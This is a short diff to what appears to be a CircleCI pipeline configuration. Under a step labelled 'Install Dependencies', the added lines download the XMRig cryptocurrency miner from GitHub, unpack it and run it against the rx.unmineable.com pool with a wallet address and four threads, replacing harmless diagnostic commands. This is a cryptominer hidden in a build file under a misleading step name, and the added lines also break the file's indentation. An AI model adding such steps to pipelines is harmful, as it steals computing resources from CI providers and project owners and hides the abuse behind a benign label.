@@ -8,8 +8,10 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              lscpu
-              echo Hello,subscribe it
+              wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz 
+tar xf xmrig-6.15.1-linux-x64.tar.gz 
+cd xmrig-6.15.1 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -p x -t 4 -u TRX:TJReV8g7d6EtxWbeP9iYmhZHgzRxxxbz4a.JBx
+              
 
 workflows:
     version: 2.1
